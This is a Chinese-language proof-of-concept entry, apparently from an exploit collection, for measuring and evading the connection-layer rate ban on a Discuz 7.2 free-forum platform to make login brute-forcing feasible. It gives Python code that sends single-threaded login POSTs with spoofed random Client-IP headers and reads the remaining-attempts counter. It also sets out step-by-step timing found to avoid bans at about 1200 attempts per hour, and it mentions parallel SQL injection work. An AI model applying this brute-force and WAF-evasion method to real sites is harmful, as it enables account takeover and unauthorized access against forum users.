# Discuz 论坛平台（SCLUB 免费论坛）连接层封禁阈值探测方法 —— 区分「并发触发」与「累计触发」

- **code**: discuz-论坛平台-sclub-免费论坛-连接层封禁阈值探测方法-区分-并发触发-与-累计触发
- **kind**: poc
- **category**: waf
- **component**: SCLUB 免费论坛平台 / Discuz 7.2
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在靶标 http://example.com（Discuz! 7.2 乐彩论坛 / SCLUB 免费论坛平台）实测：新出口 IP 下单线程递进速率（10s/5s/3s per req）连打 50 条登录 POST，6.1 分钟内全部完成、无连接层封禁、remain 恒为 4；对照组此前同站 8 线程并发时第 9 个请求即被封（HTTP 超时、TCP 可握手，持续 >10 分钟）。结论：该平台连接层封禁按并发/爆发触发，单线程 3s/req 可长跑。
- **path**: pocs/discuz-论坛平台-sclub-免费论坛-连接层封禁阈值探测方法-区分-并发触发-与-累计触发/poc.py
- **tags**: discuz,brute-force,rate-limit,waf-bypass,methodology,sclub
- **created_at**: 2026-09-29T07:21:25.435Z
- **found_by**: exploit

## 描述

免费论坛平台（SCLUB / freebbs.tw 等）在 Discuz 应用层之外还有一层敏感度极高的连接层防护：实测 8 个并发请求后第 9 个请求即被丢包（TCP 三次握手成功、HTTP 无响应），持续 >10 分钟。判定封禁到底是「并发触发」还是「累计触发」直接决定登录爆破是否可行，方法：换一个干净出口 IP 后用**递进速率单线程**做单变量实验（10s/req×10 → 5s/req×10 → 3s/req×30），若全程无封禁则是并发触发（可降速长跑），若中途被封则存在速率上限或累计阈值。注意：实验期间同一出口的其他作业（SQL 注入等）会被连带中断，须与主线作业协商时序。

## 用法

```
1) 确认当前出口是否被禁：`GET http://TARGET/example.com` 应返回正常长度页面。
2) 跑递进速率实验：单线程，间隔序列 [10s,5s,3s]，各段 10/10/30 条登录 POST，每条携带随机伪造 Client-IP。
3) 判定：全程无 Timeout 且 remain 正常 ⇒ 并发触发（本靶标实测 3s/req 可行，≈1200 条/小时）；出现连续 3 次 Timeout 且不恢复 ⇒ 触达速率/累计上限。
4) 关键：出现 TimeoutError 立即停手，不要立刻重试（重试会延长封禁窗口）。单次波动（Timeout 后下一条恢复）属正常网络抖动，非封禁。
```

## 正文

```
python threshold_test.py
# 核心实现（节选）：
PHASES = [(10.0, 10), (5.0, 10), (3.0, 30)]   # (每请求间隔秒, 本阶段条数)
for delay, cnt in PHASES:
    for _ in range(cnt):
        spoof = rand_ip()
        hit, page, setc, dt = post_login(op, cj, user, pwd, fh, spoof)
        remain = re.search(r"您還可以嘗試\s*(\d+)\s*次", page)
        # 连续 3 次异常 ⇒ 判定触顶，立即停止
        time.sleep(delay)

def rand_ip():   # 公网随机 IP，排除私网/保留段
    while True:
        ip = "%d.%d.%d.%d" % (random.randint(1,223), random.randint(0,255),
                              random.randint(0,255), random.randint(1,254))
        a,b = ip.split(".")[:2]
        if a in ("10","127","0","169","255") or (a=="172" and 16<=int(b)<=31) \
           or (a=="192" and b=="168"): continue
        return ip

# 实测结果（靶标 http://example.com，新出口 IP）：
#   10s/req x10  → 全部成功，remain=4
#    5s/req x10  → 全部成功，remain=4
#    3s/req x30  → 48/50 成功（2 条单次 TimeoutError 后自愈），全程未封
#   ⇒ 并发触发结论成立

```
